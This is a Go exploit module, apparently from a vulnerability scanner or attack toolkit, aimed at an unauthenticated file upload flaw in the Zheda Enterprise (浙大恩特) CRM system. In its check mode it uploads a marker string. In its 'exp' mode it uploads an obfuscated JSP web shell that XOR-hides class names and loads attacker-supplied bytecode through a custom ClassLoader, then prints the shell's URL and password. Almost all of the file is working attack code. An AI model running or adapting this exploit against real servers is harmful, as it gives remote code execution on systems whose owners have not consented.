package vulnerable

import (
	"compress/gzip"
	"errors"
	"fmt"
	"github.com/thanhpk/randstr"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func FileUPloadJsp(mode, target, proxyAddr string) {
	Password := randstr.Hex(12)
	Filename := randstr.Hex(8) + ".jsp"
	if mode == strings.ToLower("poc") {
		ShellStr = "浙大恩特CRM系统[/entsoft_en/entereditor/jsp/fileupload.jsp?filename=]文件上传漏洞验证测试"
	} else if mode == strings.ToLower("exp") {
		ShellStr = "<%  String H2M00 = request.getParameter(\"" + Password + "\");if (H2M00 != null) { class EgDgLDtV extends/*Zbjr10Z054*/ClassLoader { EgDgLDtV(ClassLoader Ls8Wea) { super(Ls8Wea); } public Class H2M00(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = \"\";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010; ccstr = ccstr + (char) aa[i];}Class A9S8Y = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A9S8Y.getMethod(k, String.class).invoke(A9S8Y.newInstance(), H2M00);}catch (Exception e) {int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = \"\";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);bytes = (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, H2M00);}Class aClass = new EgDgLDtV(Thread.currentThread().getContextClassLoader()).H2M00(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %>"

		urlForShell, err := fileuploader(target, Filename, ShellStr, proxyAddr)
		if err != nil {
			fmt.Println(err)
			os.Exit(0)
		}
		fmt.Println(urlForShell, Password)
		return
	}
	urlForShell, err := fileuploader(target, Filename, ShellStr, proxyAddr)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	resp, _ := http.Get(urlForShell)

	all, _ := ioutil.ReadAll(resp.Body)
	if string(all) == "浙大恩特CRM系统[/entsoft_en/entereditor/jsp/fileupload.jsp?filename=]文件上传漏洞验证测试" {
		fmt.Printf("站点存在此漏洞,Shell页面显示\n%s\n", all)
	}
}

func fileuploader(targetHost, filename, ShellContent, proxy string) (shellURL string, err error) {
	vulURL := "/entsoft_en/entereditor/jsp/fileupload.jsp?filename=" + filename
	reqHost := strings.Replace(targetHost+vulURL, "//ent", "/ent", 1)
	request, err := http.NewRequest(http.MethodPost, reqHost, strings.NewReader(ShellContent))
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	cli := HttpCli(proxy)
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
	request.Header.Set("Accept-Encoding", "gzip,deflate")
	do, err := cli.Do(request)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	defer func() {
		_ = do.Body.Close()
	}()
	if do.StatusCode != http.StatusOK {
		return "", nil
	}
	reader, _ := gzip.NewReader(do.Body)
	all, _ := ioutil.ReadAll(reader)
	if strings.Contains(string(all), filename) == true {
		replace := strings.Replace(string(all), "\r\n", "", -1)
		shellURL = strings.Replace(targetHost+replace, "//ent", "/ent", 1)
		return shellURL, nil
	}
	return "", errors.New("传了个寂寞")
}
